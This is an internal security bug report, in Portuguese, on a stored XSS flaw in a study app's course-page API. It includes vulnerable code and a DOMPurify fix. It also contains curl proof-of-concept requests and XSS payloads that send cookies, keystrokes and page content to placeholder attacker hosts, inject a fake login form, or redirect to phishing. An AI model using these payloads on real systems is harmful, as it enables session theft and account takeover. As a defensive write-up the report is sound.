# BUG-001: Stored XSS no Módulo de Páginas de Curso

## Informações Gerais

| Campo | Valor |
|-------|-------|
| **ID** | ESTUDOS-BUG-001 |
| **Título** | Stored XSS em Páginas de Curso via API sem Sanitização |
| **Gravidade** | **CRÍTICA** |
| **Recurso Afetado** | Dashboard > Estudos > Curso > Páginas |
| **Arquivos Afetados** | `src/app/api/v1/estudos/paginas/route.ts`, `src/app/api/v1/estudos/paginas/[id]/route.ts`, `src/app/(dashboard)/dashboard/estudos/[id]/page.tsx` |
| **Data de Identificação** | 2026-01-17 |

---

## Descrição

As APIs de criação (POST) e atualização (PUT) de páginas de curso **NÃO aplicam sanitização** no campo `conteudo`, diferentemente do que foi implementado para Anotações. O conteúdo HTML é salvo diretamente no banco de dados e posteriormente renderizado no frontend via `dangerouslySetInnerHTML` sem tratamento, permitindo a execução de scripts maliciosos.

**Diferença do BUG-001 de Dashboard**: Aquele bug foi corrigido para Anotações, mas a mesma correção **não foi aplicada** para Páginas de Curso.

---

## Ação Realizada

### Cenário de Teste
1. Autenticar-se na aplicação
2. Criar um curso e um módulo
3. Enviar requisição direta para a API com payload XSS

### Payload de Ataque via cURL

```bash
# Criar página com XSS via API direta (bypass do frontend)
curl -X POST 'https://app.exemplo.com/api/v1/estudos/paginas' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: [SESSION_COOKIE]' \
  -d '{
    "titulo": "Página Normal",
    "conteudo": "<img src=x onerror=\"fetch('\''https://attacker.com/steal?c='\''+document.cookie)\"><script>alert(document.domain)</script><svg onload=\"new Image().src='\''https://evil.com/?d='\''+btoa(document.body.innerHTML)\">",
    "moduloId": "[ID_DO_MODULO_EXISTENTE]"
  }'
```

```bash
# Atualizar página existente com XSS
curl -X PUT 'https://app.exemplo.com/api/v1/estudos/paginas/[PAGE_ID]' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: [SESSION_COOKIE]' \
  -d '{
    "conteudo": "<img src=x onerror=\"eval(atob('\''ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2M9Jytkb2N1bWVudC5jb29raWUp'\''))\">"
  }'
```

### Payloads XSS Testados

```html
<!-- Payload 1: Roubo de Cookie -->
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">

<!-- Payload 2: Keylogger -->
<img src=x onerror="document.onkeypress=function(e){fetch('https://attacker.com/log?key='+e.key)}">

<!-- Payload 3: Exfiltração de dados da página -->
<svg onload="new Image().src='https://evil.com/?data='+btoa(document.body.innerHTML)">

<!-- Payload 4: Redirecionamento para phishing -->
<img src=x onerror="location='https://phishing-site.com/fake-login'">

<!-- Payload 5: Injeção de formulário falso -->
<img src=x onerror="document.body.innerHTML='<form action=https://evil.com/capture><input name=email placeholder=Email><input name=password type=password placeholder=Senha><button>Login</button></form>'">
```

---

## Código Vulnerável

### API POST - Criação de Página
```typescript
// src/app/api/v1/estudos/paginas/route.ts:46-53
const pagina = await prisma.pagina.create({
  data: {
    titulo,
    conteudo: conteudo || '', // ⚠️ VULNERÁVEL: Conteúdo HTML NÃO sanitizado
    moduloId,
    ordem: ordem || 0,
  },
});
```

### API PUT - Atualização de Página
```typescript
// src/app/api/v1/estudos/paginas/[id]/route.ts:94-101
const pagina = await prisma.pagina.update({
  where: { id },
  data: {
    ...(titulo !== undefined && { titulo }),
    ...(conteudo !== undefined && { conteudo }), // ⚠️ VULNERÁVEL: Sem sanitização
    ...(ordem !== undefined && { ordem }),
  },
});
```

### Frontend - Renderização Insegura
```typescript
// src/app/(dashboard)/dashboard/estudos/[id]/page.tsx:658-661
<div
  className="prose prose-invert max-w-none..."
  dangerouslySetInnerHTML={{ __html: paginaSelecionada.conteudo }}
  // ⚠️ VULNERÁVEL: Conteúdo renderizado sem sanitização
/>
```

---

## Comparação com Correção de Anotações

A API de Anotações foi corrigida corretamente:

```typescript
// src/app/api/v1/estudos/anotacoes/route.ts:24-26 (CORRETO)
function sanitizeHTML(html: string): string {
  return DOMPurify.sanitize(html, DOMPURIFY_CONFIG);
}

// Linha 111 (CORRETO)
const conteudoSanitizado = conteudo ? sanitizeHTML(conteudo) : '';
```

**As APIs de Páginas NÃO têm essa proteção.**

---

## Impacto

| Tipo de Impacto | Descrição | Severidade |
|-----------------|-----------|------------|
| **Roubo de Sessão** | Atacante rouba cookies de sessão e assume identidade do usuário | CRÍTICO |
| **Exfiltração de Dados** | Todo conteúdo de estudos do usuário pode ser enviado para servidor externo | CRÍTICO |
| **Account Takeover** | Com o cookie de sessão, atacante tem controle total da conta | CRÍTICO |
| **Keylogging** | Captura de senhas e dados sensíveis digitados | ALTO |
| **Phishing Interno** | Formulários falsos dentro da aplicação legítima | ALTO |
| **Propagação** | Se cursos forem compartilháveis, XSS afeta múltiplos usuários | CRÍTICO |

---

## Causa Raiz

1. **Inconsistência na implementação de segurança**: A correção de XSS foi aplicada apenas em Anotações, não em Páginas
2. **Falta de sanitização no backend**: APIs POST e PUT de Páginas não usam DOMPurify
3. **Renderização insegura no frontend**: `dangerouslySetInnerHTML` sem sanitização prévia
4. **Bypass do frontend**: O RichTextEditor sanitiza, mas atacante pode enviar diretamente via API

---

## Ação Corretiva

### 1. Aplicar Sanitização na API de Páginas (URGENTE)

```typescript
// src/app/api/v1/estudos/paginas/route.ts
import DOMPurify from 'isomorphic-dompurify';

const DOMPURIFY_CONFIG = {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'b', 'em', 'i', 'u', 's', 'strike',
    'h1', 'h2', 'h3', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre',
    'img', 'a', 'span', 'div', 'mark'
  ],
  ALLOWED_ATTR: [
    'href', 'src', 'alt', 'class', 'style', 'target', 'rel',
    'data-width', 'data-height', 'data-align', 'width', 'height'
  ],
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input', 'button'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur'],
  ALLOW_DATA_ATTR: true,
};

function sanitizeHTML(html: string): string {
  return DOMPurify.sanitize(html, DOMPURIFY_CONFIG);
}

// POST - Criar página
const pagina = await prisma.pagina.create({
  data: {
    titulo,
    conteudo: conteudo ? sanitizeHTML(conteudo) : '', // ✅ CORRIGIDO
    moduloId,
    ordem: ordem || 0,
  },
});
```

### 2. Aplicar Sanitização na API PUT

```typescript
// src/app/api/v1/estudos/paginas/[id]/route.ts
import DOMPurify from 'isomorphic-dompurify';
// ... mesma config DOMPURIFY_CONFIG ...

const pagina = await prisma.pagina.update({
  where: { id },
  data: {
    ...(titulo !== undefined && { titulo }),
    ...(conteudo !== undefined && { conteudo: sanitizeHTML(conteudo) }), // ✅ CORRIGIDO
    ...(ordem !== undefined && { ordem }),
  },
});
```

### 3. Sanitização Adicional no Frontend (Defense in Depth)

```typescript
// src/app/(dashboard)/dashboard/estudos/[id]/page.tsx
import DOMPurify from 'isomorphic-dompurify';

// Na renderização:
<div
  className="prose prose-invert max-w-none..."
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(paginaSelecionada.conteudo, DOMPURIFY_CONFIG)
  }}
/>
```

### 4. Criar Utilitário Compartilhado

```typescript
// src/lib/security/sanitize.ts
import DOMPurify from 'isomorphic-dompurify';

export const DOMPURIFY_CONFIG = {
  // ... configuração padronizada ...
};

export function sanitizeHTML(html: string): string {
  return DOMPurify.sanitize(html, DOMPURIFY_CONFIG);
}
```

---

## Referências

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [CVSS Score: 9.0+ (Critical)](https://www.first.org/cvss/calculator/3.1)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)

---

## Status

| Status | Data |
|--------|------|
| Identificado | 2026-01-17 |
| Reportado | 2026-01-17 |
| **Corrigido** | 2026-01-17 |
| Verificado | - |

### Correção Aplicada
- Adicionada sanitização com DOMPurify na API POST (`src/app/api/v1/estudos/paginas/route.ts`)
- Adicionada sanitização com DOMPurify na API PUT (`src/app/api/v1/estudos/paginas/[id]/route.ts`)
- Mesma configuração utilizada na API de anotações para consistência

---

## Prioridade de Correção

**⚠️ URGENTE - CRÍTICO**

Esta vulnerabilidade deve ser corrigida **imediatamente** antes de qualquer outro trabalho no módulo de Estudos. O risco de exploração é alto e o impacto é severo (account takeover).
